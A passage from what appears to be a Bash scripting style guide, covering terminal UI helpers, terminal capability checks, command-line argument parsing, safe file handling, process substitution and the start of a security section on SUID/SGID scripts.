  local -a frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
  local -i i=0
  while ((1)); do
    printf '\r%s %s' "${frames[i % ${#frames[@]}]}" "$*"
    i+=1
    sleep 0.1
  done
}

# Start spinner in background
spinner 'Processing...' &
spinner_pid=$!

# Do work...
long_operation

# Stop spinner
kill "$spinner_pid" 2>/dev/null
printf '\r\033[K'  # Clear line
```

#### Progress Bar

```bash
progress_bar() {
  local -i current=$1 total=$2 width=${3:-50}
  local -i filled=$((current * width / total))
  local -i empty=$((width - filled))
  local -- bar

  bar=$(printf '%*s' "$filled" '' | tr ' ' '█')
  bar+=$(printf '%*s' "$empty" '' | tr ' ' '░')

  printf '\r[%s] %3d%%' "$bar" $((current * 100 / total))
}

# Usage
declare -i i
for ((i=1; i<=100; i+=1)); do
  progress_bar "$i" 100
  sleep 0.05
done
echo
```

#### Cursor Control

```bash
# Hide/show cursor
hide_cursor() { printf '\033[?25l'; }
show_cursor() { printf '\033[?25h'; }
trap 'show_cursor' EXIT

# Move cursor
move_up() { printf '\033[%dA' "${1:-1}"; }
move_down() { printf '\033[%dB' "${1:-1}"; }
move_to() { printf '\033[%d;%dH' "$1" "$2"; }

# Clear operations
clear_line() { printf '\033[2K\r'; }
clear_screen() { printf '\033[2J\033[H'; }
clear_to_end() { printf '\033[J'; }
```

#### Interactive Menu

```bash
select_option() {
  local -a options=("$@")
  local -i selected=0
  local -- key

  hide_cursor
  trap 'show_cursor' RETURN

  while ((1)); do
    # Display menu
    local -i i
    for ((i=0; i<${#options[@]}; i+=1)); do
      if ((i == selected)); then
        printf '  \033[7m %s \033[0m\n' "${options[i]}"
      else
        printf '   %s\n' "${options[i]}"
      fi
    done

    # Read keypress
    IFS= read -rsn1 key
    case $key in
      $'\x1b')  # Escape sequence
        read -rsn2 key
        case "$key" in
          '[A') ((selected > 0)) && ((selected-=1)) ;;  # Up
          '[B') ((selected < ${#options[@]}-1)) && ((selected+=1)) ;;  # Down
        esac
        ;;
      '') break ;;  # Enter
    esac

    # Move cursor back up
    printf '\033[%dA' "${#options[@]}"
  done

  show_cursor
  return "$selected"
}

# Usage
select_option 'Option 1' 'Option 2' 'Option 3'
selected=$?
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - TUI without terminal check
progress_bar 50 100  # Garbage if not a terminal

# ✓ Correct - check for terminal
if [[ -t 1 ]]; then
  progress_bar 50 100
else
  echo '50% complete'
fi
```

---

**See Also:** BCS0908 (Terminal Capabilities), BCS0701 (Color Support)


---


**Rule: BCS0708**

## Terminal Capabilities

**Rule: BCS0908**

Detecting and utilizing terminal features safely.

---

#### Rationale

Terminal capability detection ensures scripts work in all environments, provides graceful fallbacks for limited terminals, enables rich output when available, and prevents garbage output in non-terminal contexts.

---

#### Terminal Detection

```bash
declare -i USE_COLORS
# Check if stdout is a terminal
if [[ -t 1 ]]; then
  # Terminal - can use colors, cursor control
  USE_COLORS=1
else
  # Pipe or redirect - plain output only
  USE_COLORS=0
fi

# Check both stdout and stderr
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' NC=$'\033[0m'
else
  declare -r RED='' NC=''
fi
```

#### Terminal Size

```bash
# Get terminal dimensions
get_terminal_size() {
  if [[ -t 1 ]]; then
    TERM_COLS=$(tput cols 2>/dev/null || echo 80)
    TERM_ROWS=$(tput lines 2>/dev/null || echo 24)
  else
    TERM_COLS=80
    TERM_ROWS=24
  fi
}

# Auto-update on resize
trap 'get_terminal_size' WINCH
get_terminal_size
```

#### Capability Checking

```bash
# Check for specific capability
has_capability() {
  local -- cap=$1
  tput "$cap" &>/dev/null
}

# Use with fallback
if has_capability colors; then
  num_colors=$(tput colors)
  ((num_colors >= 256)) && USE_256_COLORS=1 ||:
fi

# Check for Unicode support
has_unicode() {
  [[ "${LC_ALL:-${LC_CTYPE:-${LANG:-}}}" == *UTF-8* ]]
}
```

#### Safe Output Functions

```bash
# Width-aware output
print_line() {
  local -i width=${TERM_COLS:-80}
  printf '%*s\n' "$width" '' | tr ' ' '─'
}

# Truncate to terminal width
truncate_string() {
  local -- str=$1
  local -i max=${2:-$TERM_COLS}

  if ((${#str} > max)); then
    echo "${str:0:$((max-3))}..."
  else
    echo "$str"
  fi
}

# Center text
center_text() {
  local -- text=$1
  local -i width=${TERM_COLS:-80}
  local -i padding=$(((width - ${#text}) / 2))

  printf '%*s%s\n' "$padding" '' "$text"
}
```

#### ANSI Code Reference

```bash
# Common ANSI escape codes
declare -r ESC=$'\033'

# Colors (foreground)
declare -r BLACK="${ESC}[30m"  RED="${ESC}[31m"
declare -r GREEN="${ESC}[32m"  YELLOW="${ESC}[33m"
declare -r BLUE="${ESC}[34m"   MAGENTA="${ESC}[35m"
declare -r CYAN="${ESC}[36m"   WHITE="${ESC}[37m"

# Styles
declare -r BOLD="${ESC}[1m"    DIM="${ESC}[2m"
declare -r ITALIC="${ESC}[3m"  UNDERLINE="${ESC}[4m"
declare -r BLINK="${ESC}[5m"   REVERSE="${ESC}[7m"

# Reset
declare -r NC="${ESC}[0m"
declare -n RESET=NC

# Cursor
declare -r HIDE_CURSOR="${ESC}[?25l"
declare -r SHOW_CURSOR="${ESC}[?25h"
declare -r SAVE_CURSOR="${ESC}7"
declare -r RESTORE_CURSOR="${ESC}8"
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - assuming terminal support
echo -e '\033[31mError\033[0m'  # May output garbage

# ✓ Correct - conditional output
if [[ -t 1 ]]; then
  echo -e '\033[31mError\033[0m'
else
  echo 'Error'
fi
```

```bash
# ✗ Wrong - hardcoded width
printf '%-80s\n' "$text"  # May wrap or truncate wrong

# ✓ Correct - use terminal width
printf '%-*s\n' "${TERM_COLS:-80}" "$text"
```

---

**See Also:** BCS0907 (TUI Basics), BCS0906 (Color Management)


---


**Rule: BCS0800**

# Command-Line Arguments

Standard argument parsing for consistent CLI interfaces: short options (`-h`, `-v`), long options (`--help`, `--version`), canonical version format (`scriptname X.Y.Z`), validation patterns for required arguments and option conflicts, and argument parsing placement (main function vs top-level) based on script complexity.


---


**Rule: BCS0801**

## Standard Argument Parsing Pattern

**Complete pattern with short option support:**

```bash
while (($#)); do case $1 in
  -a|--add)       noarg "$@"; shift
                  process_argument "$1" ;;
  -m|--depth)     noarg "$@"; shift
                  max_depth=$1 ;;
  -L|--follow-symbolic)
                  symbolic='-L' ;;

  -p|--prompt)    PROMPT=1; ((VERBOSE)) || VERBOSE=1 ;;
  -v|--verbose)   VERBOSE+=1 ;;
  -q|--quiet)     VERBOSE=0 ;;

  -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
  -h|--help)      show_help; exit 0 ;;

  -[amLpvqVh]*) #shellcheck disable=SC2046 #split up single options
                  set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
  -*)             die 22 "Invalid option ${1@Q}" ;;
  *)              Paths+=("$1") ;;
esac; shift; done
```

**Pattern breakdown:**

| Element | Purpose |
|---------|---------|
| `while (($#))` | Arithmetic test, true while args remain (more efficient than `[[ $# -gt 0 ]]`) |
| `case $1 in` | Pattern matching for options, supports multiple patterns: `-a\|--add` |
| `noarg "$@"; shift` | Validate arg exists before capturing value |
| `VERBOSE+=1` | Allows stacking: `-vvv` = `VERBOSE=3` |
| `-V\|--version)` | Exit immediately with `exit 0` (or `return 0` in functions) |
| `esac; shift; done` | Mandatory shift at end prevents infinite loop |

**Short option bundling (always include):**

```bash
-[VhamLpvq]*) #shellcheck disable=SC2046 #split up single options
              set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
```

Splits `-vpL file` �' `-v -p -L file`. Mechanism: `${1:1}` removes dash, `grep -o .` splits chars, `printf -- "-%c "` adds dashes, `set --` replaces arg list.

**The `noarg` helper:**

```bash
noarg() { (($# > 1)) || die 2 "Option ${1@Q} requires an argument"; }
```

Validates option has argument before shift. `./script -m` (missing value) �' "Option '-m' requires an argument"

**Anti-patterns:**

```bash
# ✗ Wrong - using while [[ ]] instead of (())
while [[ $# -gt 0 ]]; do  # Verbose, less efficient
# ✓ Correct
while (($#)); do

# ✗ Wrong - not calling noarg before shift
-o|--output)    shift
                output_file=$1 ;;  # Fails if no argument!
# ✓ Correct
-o|--output)    noarg "$@"; shift
                output_file=$1 ;;

# ✗ Wrong - forgetting shift at loop end
esac; done  # Infinite loop!
# ✓ Correct
esac; shift; done

# ✗ Wrong - using if/elif chains instead of case
if [[ "$1" == '-v' ]] || [[ "$1" == '--verbose' ]]; then
# ✓ Correct - use case statement
case $1 in
  -v|--verbose) VERBOSE+=1 ;;
```

**Rationale:** Consistent structure for all scripts. Handles options with/without arguments and bundled shorts. Safe argument validation. Case statement more readable than if/elif. Arithmetic `(($#))` faster than `[[ ]]`. Follows Unix conventions.


---


**Rule: BCS0802**

## Version Output Format

**Standard format:** `<script_name> <version_number>`

Output script name, space, version number. Do **not** include "version", "vs", or "v".

```bash
# ✓ Correct
-V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
# Output: myscript 1.2.3

# ✗ Wrong - do not include the word "version"
-V|--version)   echo "$SCRIPT_NAME version $VERSION"; exit 0 ;;
# Output: myscript version 1.2.3  (incorrect)
```

**Rationale:** Follows GNU standards and Unix/Linux utility conventions.


---


**Rule: BCS0803**

## Argument Validation

**Use validation helpers to ensure option arguments exist and are valid types before processing.**

**Rationale:** Prevents silent failures, provides clear error messages, catches mistakes like `--output --verbose` where filename is missing, validates data types before use.

### Three Validation Patterns

**1. `noarg()` - Basic Existence Check**

```bash
noarg() { (($# > 1)) && [[ ${2:0:1} != '-' ]] || die 2 "Missing argument for option ${1@Q}"; }
```

Checks: at least 2 args remain, next arg doesn't start with `-`.

**2. `arg2()` - Enhanced Validation with Safe Quoting**

```bash
arg2() {
  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
    die 2 "${1@Q} requires argument"
  fi
}
```

Uses `${1@Q}` for safe parameter quoting in error messages.

**3. `arg_num()` - Numeric Argument Validation**

```bash
arg_num() { ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]] && die 2 "${1@Q} requires a numeric argument" ||:; }
```

Validates argument exists and matches integer pattern (`^[0-9]+$`). Rejects negatives, decimals, non-numeric text.

### Usage Pattern

```bash
while (($#)); do case $1 in
  -o|--output)  arg2 "$@"; shift; OUTPUT=$1 ;;
  -d|--depth)   arg_num "$@"; shift; MAX_DEPTH=$1 ;;
  -v|--verbose) VERBOSE=1 ;;
esac; shift; done
```

**Critical:** Call validator BEFORE `shift` - validator needs to inspect `$2`.

### Choosing the Right Validator

| Validator | Use Case | Example Options |
|-----------|----------|----------------|
| `noarg()` | Simple existence check | `-o FILE`, `-m MSG` |
| `arg2()` | String args, prevent `-` prefix | `--prefix PATH`, `--output FILE` |
| `arg_num()` | Numeric args requiring integers | `--depth NUM`, `--retries COUNT` |

### Anti-Patterns

```bash
# ✗ No validation - silent failure
-o|--output) shift; OUTPUT=$1 ;;
# Problem: --output --verbose �' OUTPUT='--verbose'

# ✗ No validation - type error later
-d|--depth) shift; MAX_DEPTH=$1 ;;
# Problem: --depth abc �' arithmetic errors: "abc: syntax error"

# ✓ Use helpers
-p|--prefix) arg2 "$@"; shift; PREFIX=$1 ;;
```

### Error Message Quality

The `${1@Q}` pattern safely quotes special characters:
```bash
# User input: script '--some-weird$option' value
# With ${1@Q}: error: '--some-weird$option' requires argument
# Without:     error: --some-weird (crashes or expands $option)
```

See BCS04XX for `${parameter@Q}` shell quoting operator details.


---


**Rule: BCS0804**

## Argument Parsing Location

**Recommendation:** Place argument parsing inside `main()` rather than at top level.

**Benefits:** Better testability, cleaner variable scoping (parsing vars local to `main()`), encapsulation, easier unit testing.

```bash
# Recommended: Parsing inside main()
main() {
  # Parse command-line arguments
  while (($#)); do
    case $1 in
      --builtin)    INSTALL_BUILTIN=1
                    BUILTIN_REQUESTED=1
                    ;;
      --no-builtin) SKIP_BUILTIN=1
                    ;;
      --prefix)     shift
                    PREFIX=$1
                    # Update derived paths
                    BIN_DIR="$PREFIX"/bin
                    LOADABLE_DIR="$PREFIX"/lib/bash/loadables
                    ;;
      -h|--help)    show_help
                    exit 0
                    ;;
      -*)           die 22 "Invalid option ${1@Q}"
                    ;;
      *)            >&2 show_help
                    die 2 "Unknown option ${1@Q}"
                    ;;
    esac
    shift
  done

  # Proceed with main logic
  check_prerequisites
  build_components
  install_components
}

main "$@"
#fin
```

**Alternative:** For simple scripts (<200 lines) without `main()`, top-level parsing is acceptable:

```bash
#!/bin/bash
set -euo pipefail

# Simple scripts can parse at top level
while (($#)); do case $1 in
  -v|--verbose) VERBOSE=1 ;;
  -h|--help)    show_help; exit 0 ;;
  -*)           die 22 "Invalid option ${1@Q}" ;;
  *)            FILES+=("$1") ;;
esac; shift; done

# Rest of simple script logic
```


---


**Rule: BCS0805**

## Short-Option Disaggregation

## Overview

Splits bundled short options (e.g., `-abc`) into individual options (`-a -b -c`) for processing. Enables `script -vvn` instead of `script -v -v -n`, following Unix conventions.

Without disaggregation, `-lha` is treated as unknown single option rather than `-l -h -a`.

## The Three Methods

### Method 1: grep (Current Standard)

```bash
-[amLpvqVh]*) #shellcheck disable=SC2046 #split up aggregated short options
  set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}"
  ;;
```

**How it works:** `${1:1}` removes leading dash �' `grep -o .` outputs each char on separate line �' `printf -- "-%c "` prepends dash �' `set --` replaces argument list.

**Performance:** ~190 iter/sec | External dep: grep | Requires SC2046 disable

### Method 2: fold

```bash
-[amLpvqVh]*) #shellcheck disable=SC2046
  set -- '' $(printf -- '-%c ' $(fold -w1 <<<"${1:1}")) "${@:2}"
  ;;
```

**Performance:** ~195 iter/sec (+2.3%) | External dep: fold | Requires SC2046 disable

### Method 3: Pure Bash (Recommended for Performance)

```bash
-[mjvqVh]*) # Split up single options (pure bash)
  local -- opt=${1:1}
  local -a new_args=()
  while ((${#opt})); do
    new_args+=("-${opt:0:1}")
    opt=${opt:1}
  done
  set -- '' "${new_args[@]}" "${@:2}" ;;
```

**Performance:** ~318 iter/sec (+68%) | No external deps | No shellcheck warnings

## Performance Comparison

| Method | Iter/Sec | Relative | External Deps | Shellcheck |
|--------|----------|----------|---------------|------------|
| grep | 190.82 | Baseline | grep | SC2046 |
| fold | 195.25 | +2.3% | fold | SC2046 |
| **Pure Bash** | **317.75** | **+66.5%** | **None** | **Clean** |

## Complete Implementation Example (Pure Bash)

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -i VERBOSE=0
declare -i PARALLEL=1
declare -- mode='normal'
declare -a targets=()

error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
noarg() { (($# > 1)) || die 2 "Option '$1' requires an argument"; }

show_help() {
  cat <<EOF
Usage: $SCRIPT_NAME [OPTIONS] TARGET...

Options:
  -m, --mode MODE    Processing mode (normal|fast|safe)
  -j, --parallel N   Number of parallel jobs (default: 1)
  -v, --verbose      Verbose output (stackable)
  -q, --quiet        Quiet mode
  -V, --version      Show version
  -h, --help         Show this help
EOF
}

main() {
  while (($#)); do case $1 in
    -m|--mode)      noarg "$@"; shift; mode=$1 ;;
    -j|--parallel)  noarg "$@"; shift; PARALLEL=$1 ;;
    -v|--verbose)   VERBOSE+=1 ;;
    -q|--quiet)     VERBOSE=0 ;;
    -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -h|--help)      show_help; exit 0 ;;

    # Short option bundling (pure bash)
    -[mjvqVh]*) local -- opt=${1:1}
                local -a new_args=()
                while ((${#opt})); do
                  new_args+=("-${opt:0:1}")
                  opt=${opt:1}
                done
                set -- '' "${new_args[@]}" "${@:2}" ;;
    -*)         die 22 "Invalid option '$1'" ;;
    *)          targets+=("$1") ;;
  esac; shift; done

  readonly -- VERBOSE PARALLEL mode
  readonly -a targets

  ((${#targets[@]} > 0)) || die 2 'No targets specified'
  [[ "$mode" =~ ^(normal|fast|safe)$ ]] || die 2 "Invalid mode: '$mode'"
  ((PARALLEL > 0)) || die 2 'Parallel jobs must be positive'

  local -- target
  for target in "${targets[@]}"; do
    ((VERBOSE)) && echo "Processing '$target'"
  done
}

main "$@"
#fin
```

## Edge Cases

### Options Requiring Arguments

Options with arguments cannot be mid-bundle:

```bash
# ✓ Correct - argument option at end or separate
./script -vno output.txt file.txt    # -v -n -o output.txt
./script -vn -o output.txt file.txt

# ✗ Wrong - argument option in middle
./script -von output.txt file.txt    # -o captures "n" as argument!
```

### Character Set Validation

Pattern `-[amLpvqVh]*` explicitly lists valid options:
- Prevents disaggregation of unknown options
- Unknown options caught by `-*)` case
- Documents valid short options

```bash
-[ovnVh]*)  # Only these are valid short options

./script -xyz  # Doesn't match, caught by -*) �' Error: Invalid option '-xyz'
```

### Special Characters

All methods handle correctly: digits (`-123` �' `-1 -2 -3`), letters, mixed (`-v1n2` �' `-v -1 -n -2`).

## Implementation Checklist

- [ ] List all valid short options in pattern: `-[ovnVh]*`
- [ ] Place disaggregation case before `-*)` invalid option case
- [ ] Ensure `shift` at end of loop for all cases
- [ ] Document options-with-arguments bundling limitations
- [ ] Add shellcheck disable for grep/fold methods
- [ ] Test: single options, bundled, mixed long/short, stacking (`-vvv`)

## Recommendations

**Use grep method** unless:
- Performance is critical (loops, build systems, interactive tools)
- External dependencies are a concern
- Running in restricted environments

**Use Pure Bash** for high-performance scripts called frequently or in containers.


---


**Rule: BCS0900**

# File Operations

Safe file handling practices for shell scripting. Covers file testing operators (`-e`, `-f`, `-d`, `-r`, `-w`, `-x`) with explicit quoting, safe wildcard expansion (`rm ./*` never `rm *`), process substitution (`< <(command)`) to avoid subshell variable issues, and here documents for multi-line input. Prevents accidental deletion, handles special characters safely, ensures reliable operations across environments.


---


**Rule: BCS0901**

## Safe File Testing

**Always quote variables and use `[[ ]]` for file tests:**

```bash
[[ -f "$file" ]] && source "$file"
[[ -d "$path" ]] || die 1 "Not a directory ${path@Q}"
[[ -r "$file" ]] || warn "Cannot read ${file@Q}"
[[ -x "$script" ]] || die 1 "Not executable ${script@Q}"

# Multiple conditions
if [[ -f "$config" && -r "$config" ]]; then
  source "$config"
else
  die 3 "Config file not found or not readable ${config@Q}"
fi

# File timestamps
[[ "$source" -nt "$destination" ]] && cp "$source" "$destination"
```

**File test operators:**

| Operator | True If | Operator | True If |
|----------|---------|----------|---------|
| `-e file` | Exists (any type) | `-r file` | Readable |
| `-f file` | Regular file | `-w file` | Writable |
| `-d dir` | Directory | `-x file` | Executable |
| `-L link` | Symbolic link | `-s file` | Non-empty (size > 0) |
| `-p pipe` | Named pipe | `-O file` | You own it |
| `-S sock` | Socket | `-G file` | Group matches yours |
| `-b/-c` | Block/char device | `-N file` | Modified since last read |
| `-u/-g/-k` | SUID/SGID/sticky | | |

**Comparison:** `-nt` (newer), `-ot` (older), `-ef` (same inode)

**Rationale:**
- Quote `"$file"` to prevent word splitting/glob expansion
- `[[ ]]` more robust than `[ ]`
- Test before use, fail fast with `|| die`
- Include filename in error messages

**Common patterns:**

```bash
validate_file() {
  local file=$1
  [[ -f "$file" ]] || die 2 "File not found ${file@Q}"
  [[ -r "$file" ]] || die 5 "Cannot read file ${file@Q}"
}

ensure_writable_dir() {
  local dir=$1
  [[ -d "$dir" ]] || mkdir -p "$dir" || die 1 "Cannot create directory ${dir@Q}"
  [[ -w "$dir" ]] || die 5 "Directory not writable ${dir@Q}"
}

is_executable_script() {
  local file=$1
  [[ -f "$file" && -x "$file" && -s "$file" ]]
}
```

**Anti-patterns:**

```bash
# ✗ Wrong - unquoted variable (breaks with spaces/special chars)
[[ -f $file ]]
# ✓ Correct
[[ -f "$file" ]]

# ✗ Wrong - old [ ] syntax
if [ -f "$file" ]; then
# ✓ Correct
if [[ -f "$file" ]]; then

# ✗ Wrong - not checking before use
source "$config"
# ✓ Correct - validate first
[[ -f "$config" ]] || die 3 "Config not found ${config@Q}"
source "$config"

# ✗ Wrong - mkdir failure not caught
[[ -d "$dir" ]] || mkdir "$dir"
# ✓ Correct
[[ -d "$dir" ]] || mkdir "$dir" || die 1 "Cannot create directory: ${dir@Q}"
```


---


**Rule: BCS0902**

## Wildcard Expansion
Always use explicit path with wildcards to prevent filenames starting with `-` from being interpreted as flags.

```bash
# ✓ Correct - explicit path prevents flag interpretation
rm -v ./*
for file in ./*.txt; do
  process "$file"
done

# ✗ Incorrect - filenames starting with - become flags
rm -v *
```


---


**Rule: BCS0903**

## Process Substitution

**Use `<(command)` and `>(command)` to provide command output as file-like inputs or send data to commands as files. Eliminates temp files, avoids subshell issues with pipes, enables parallel processing.**

**Rationale:**
- No temp files - data streams through FIFOs/file descriptors without disk I/O
- Avoids subshells - unlike pipes to while, preserves variable scope
- Multiple inputs run in parallel; clean syntax vs complex piping

**How it works:**

```bash
# <(command) - Input: creates /dev/fd/N, reads from command's stdout
# >(command) - Output: creates /dev/fd/N, writes to command's stdin

diff <(sort file1) <(sort file2)
# Expands to: diff /dev/fd/63 /dev/fd/64
```

**Basic patterns:**

```bash
# Input process substitution <(command)
diff <(ls dir1) <(ls dir2)
cat <(echo "Header") <(cat data.txt) <(echo "Footer")
paste <(cut -d: -f1 /etc/passwd) <(cut -d: -f3 /etc/passwd)

# Output process substitution >(command)
command | tee >(wc -l) >(grep ERROR) > output.txt
echo "data" > >(base64)
```

**Common use cases:**

**1. Comparing outputs:**
```bash
diff <(ls -1 /dir1 | sort) <(ls -1 /dir2 | sort)
diff <(ssh host1 cat /etc/config) <(ssh host2 cat /etc/config)
```

**2. Reading into array (avoids subshell):**
```bash
declare -a users
readarray -t users < <(getent passwd | cut -d: -f1)

# Null-delimited for safe filenames
declare -a files
readarray -d '' -t files < <(find /data -type f -print0)
```

**3. While loop without subshell:**
```bash
declare -i count=0
while IFS= read -r line; do
  ((count+=1))
done < <(cat file.txt)
echo "Count: $count"  # Correct value!
```

**4. Multiple simultaneous inputs:**
```bash
while IFS= read -r line1 <&3 && IFS= read -r line2 <&4; do
  echo "File1: ${line1@Q}"
  echo "File2: ${line2@Q}"
done 3< <(cat file1.txt) 4< <(cat file2.txt)

sort -m <(sort file1) <(sort file2) <(sort file3)
```

**5. Parallel processing with tee:**
```bash
cat logfile.txt | tee \
  >(grep ERROR > errors.log) \
  >(grep WARN > warnings.log) \
  >(wc -l > line_count.txt) \
  > all_output.log
```

**Complete example - Data merging:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

merge_user_data() {
  local -- source1=$1
  local -- source2=$2

  local -a users1 users2
  readarray -t users1 < <(cut -d: -f1 "$source1" | sort -u)
  readarray -t users2 < <(cut -d: -f1 "$source2" | sort -u)

  # Find users in both, only in source1, only in source2
  local -a common only_source1 only_source2
  readarray -t common < <(comm -12 <(printf '%s\n' "${users1[@]}") <(printf '%s\n' "${users2[@]}"))
  readarray -t only_source1 < <(comm -23 <(printf '%s\n' "${users1[@]}") <(printf '%s\n' "${users2[@]}"))
  readarray -t only_source2 < <(comm -13 <(printf '%s\n' "${users1[@]}") <(printf '%s\n' "${users2[@]}"))

  info "Common: ${#common[@]}, Only src1: ${#only_source1[@]}, Only src2: ${#only_source2[@]}"
}

main() {
  merge_user_data '/etc/passwd' '/backup/passwd'
}

main "$@"
#fin
```

**Anti-patterns:**

```bash
# ✗ Wrong - temp files instead of process substitution
temp1=$(mktemp); temp2=$(mktemp)
sort file1 > "$temp1"; sort file2 > "$temp2"
diff "$temp1" "$temp2"; rm "$temp1" "$temp2"

# ✓ Correct
diff <(sort file1) <(sort file2)

# ✗ Wrong - pipe creates subshell, count stays 0
declare -i count=0
cat file | while read -r line; do count+=1; done
echo "$count"  # Still 0!

# ✓ Correct - process substitution preserves scope
declare -i count=0
while read -r line; do count+=1; done < <(cat file)
echo "$count"  # Correct value!

# ✗ Wrong - reads file 3 times sequentially
cat log | grep ERROR > errors.txt
cat log | grep WARN > warnings.txt
cat log | wc -l > count.txt

# ✓ Correct - reads once, processes in parallel
cat log | tee >(grep ERROR > errors.txt) >(grep WARN > warnings.txt) >(wc -l > count.txt) > /dev/null

# ✗ Wrong - unquoted variables
diff <(sort $file1) <(sort $file2)

# ✓ Correct
diff <(sort "$file1") <(sort "$file2")
```

**Edge cases:**

**1. File descriptor assignment:**
```bash
exec 3< <(long_running_command)
while IFS= read -r line <&3; do echo "$line"; done
exec 3<&-
```

**2. NULL-delimited with process substitution:**
```bash
while IFS= read -r -d '' file; do
  echo "Processing ${file@Q}"
done < <(find /data -type f -print0)
```

**3. Nested process substitution:**
```bash
diff <(sort <(grep pattern file1)) <(sort <(grep pattern file2))
```

**When NOT to use:**

```bash
# Simple command output - command substitution is clearer
result=$(command)  # Not: result=$(cat <(command))

# Single file input - direct redirection is clearer
grep pattern file  # Not: grep pattern < <(cat file)

# Variable expansion - use here-string
command <<< "$variable"  # Not: command < <(echo "$variable")
```

**Key principle:** Process substitution treats command output as a file. More efficient than temp files, safer than pipes (no subshell), enables powerful data processing. When creating temp files to pass data between commands, process substitution is almost always better.


---


**Rule: BCS0904**

## Here Documents

Use for multi-line strings or input.

```bash
# No variable expansion (note single quotes)
cat <<'EOT'
This is a multi-line
string with no variable
expansion.
EOT

# With variable expansion
cat <<EOT
User: $USER
Home: $HOME
EOT
```


---


**Rule: BCS0905**

## Input Redirection vs Cat: Performance Optimization

Replace `cat filename` with `< filename` redirection to eliminate process fork overhead. Provides 3-100x speedup.

## Performance Comparison

| Scenario | `cat` | `< file` | Speedup |
|----------|-------|----------|---------|
| Output to /dev/null (1000 iter) | 0.792s | 0.234s | **3.4x** |
| Command substitution (1000 iter) | 0.965s | 0.009s | **107x** |
| Large file (500 iter) | 0.398s | 0.115s | **3.5x** |

**Why:** `cat` requires fork�'exec�'load�'read�'wait�'cleanup (7 steps). Redirection: open�'read�'close (3 steps). Command substitution `$(< file)` has zero external processes.

## When to Use `< filename`

### Command Substitution (107x speedup)

```bash
# RECOMMENDED - Zero external processes
content=$(< file.txt)
config=$(< /etc/app.conf)

# AVOID - 100x slower
content=$(cat file.txt)
```

### Single Input to Command (3-4x speedup)

```bash
# RECOMMENDED
grep "pattern" < file.txt
while read line; do ...; done < file.txt
jq '.field' < data.json

# AVOID - Wastes a cat process
cat file.txt | grep "pattern"
cat data.json | jq '.field'
```

### Loop Optimization (cumulative gains)

```bash
# RECOMMENDED
for file in *.json; do
    data=$(< "$file")
    process "$data"
done

# AVOID - Forks cat thousands of times
for file in *.json; do
    data=$(cat "$file")
done
```

## When NOT to Use `< filename`

| Scenario | Why | Use Instead |
|----------|-----|-------------|
| Multiple files | Invalid syntax | `cat file1 file2` |
| Need cat options | No `-n`, `-A`, etc. | `cat -n file` |
| Direct output | `< file` alone produces nothing | `cat file` |
| Concatenation | Cannot combine sources | `cat f1 f2 f3` |

### Invalid Usage

```bash
# WRONG - Does nothing (no command to consume stdin)
< /tmp/test.txt

# WRONG - Invalid syntax
< file1.txt file2.txt

# RIGHT - Must use cat for multiple files
cat file1.txt file2.txt
```

## Technical Details

The `<` operator is a **redirection operator**, not a command. It opens a file on stdin but requires a command to consume input.

**Exception:** Command substitution `$(< file)` - bash reads file directly into variable.

## Real-World Example

**Before (400 forks for 100 files):**
```bash
for logfile in /var/log/app/*.log; do
    content=$(cat "$logfile")
    errors=$(cat "$logfile" | grep -c ERROR)
    warnings=$(cat "$logfile" | grep WARNING)
done
```

**After (100 forks eliminated per file):**
```bash
for logfile in /var/log/app/*.log; do
    content=$(< "$logfile")
    errors=$(grep -c ERROR < "$logfile")
    warnings=$(grep WARNING < "$logfile")
done
```

## Recommendation

**SHOULD use `< filename`:**
- Command substitution: `var=$(< file)`
- Single file input: `cmd < file`
- Loops with file reads

**MUST use `cat`:**
- Multiple file arguments
- Using options `-n`, `-b`, `-E`, `-T`, `-s`, `-v`

## Testing

```bash
# Command substitution speedup
time for i in {1..1000}; do content=$(cat /tmp/test.txt); done  # ~0.8-1.0s
time for i in {1..1000}; do content=$(< /tmp/test.txt); done    # ~0.01s

# Pipeline speedup
time for i in {1..500}; do cat /tmp/numbers.txt | wc -l > /dev/null; done  # ~0.4s
time for i in {1..500}; do wc -l < /tmp/numbers.txt > /dev/null; done      # ~0.1s
```

## See Also

- ShellCheck SC2002 (useless cat)
- Bash manual: Redirections


---


**Rule: BCS1000**

# Security Considerations

Establishes security-first practices covering five essential areas: no SUID/SGID on bash scripts (inherent security risks), locked-down PATH validation (prevent command hijacking), IFS safety (avoid word-splitting vulnerabilities), `eval` avoidance (injection risks—requires explicit justification), and input sanitization patterns (validate/clean early). Prevents privilege escalation, command injection, path traversal, and common shell attack vectors.


---


**Rule: BCS1001**

## SUID/SGID

**Never use SUID/SGID bits on Bash scripts. Critical security prohibition with no exceptions.**

```bash
# ✗ NEVER do this
chmod u+s /usr/local/bin/myscript.sh  # SUID
chmod g+s /usr/local/bin/myscript.sh  # SGID

# ✓ Use sudo instead
sudo /usr/local/bin/myscript.sh
# In /etc/sudoers: username ALL=(ALL) NOPASSWD: /usr/local/bin/myscript.sh
```

**Rationale:**

- **IFS Exploitation**: Attacker controls word splitting with elevated privileges
